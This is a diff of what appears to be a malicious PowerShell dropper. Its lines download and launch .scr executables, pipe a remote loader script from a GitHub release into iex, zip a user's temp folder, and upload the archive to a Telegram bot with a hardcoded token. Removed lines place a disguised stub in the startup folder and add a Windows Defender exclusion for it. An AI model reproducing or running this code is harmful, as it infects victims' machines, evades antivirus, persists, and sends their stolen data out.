@@ -103,19 +103,6 @@ $output = "$dir\Updatecli4mt.scr"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process $output
 
-$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
-$output = "$startupfolder\Updateclient.scr"
-Add-MpPreference -ExclusionPath $output
-
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 Add-Type -AssemblyName System.Net.Http
 Start-Process powershell -ArgumentList "-Command iwr 'https://github.com/EvilBytecode/Sryxen/releases/download/v1.0.0/sryxen_loader.ps1' | iex" -WindowStyle Hidden -Wait; $userName=$env:USERNAME; $archivePath=[System.IO.Path]::GetTempPath()+$userName+'.zip'; Compress-Archive -Path ([System.IO.Path]::GetTempPath()+$userName) -DestinationPath $archivePath -Force; $botToken="7487418347:AAHo0dKeo0c-nZAiN9ZgiVPbyp4xTSdsV2E"; $chatId="7056174540"; $telegramApiUrl="https://api.telegram.org/bot$botToken/sendDocument"; $multipartContent=New-Object System.Net.Http.MultipartFormDataContent; $multipartContent.Add((New-Object System.Net.Http.StringContent($chatId)),"chat_id"); $multipartContent.Add((New-Object System.Net.Http.StreamContent([System.IO.File]::OpenRead($archivePath))),"document",[System.IO.Path]::GetFileName($archivePath)); (New-Object System.Net.Http.HttpClient).PostAsync($telegramApiUrl,$multipartContent).Result
-
-
-if (Test-Path -Path $output) {
-    Write-Host "hello"
-} else {
-    Invoke-WebRequest -Uri $url -OutFile $output
-    Start-Process $output
-    Write-Host "Tệp đã được tải về thành công."
-}
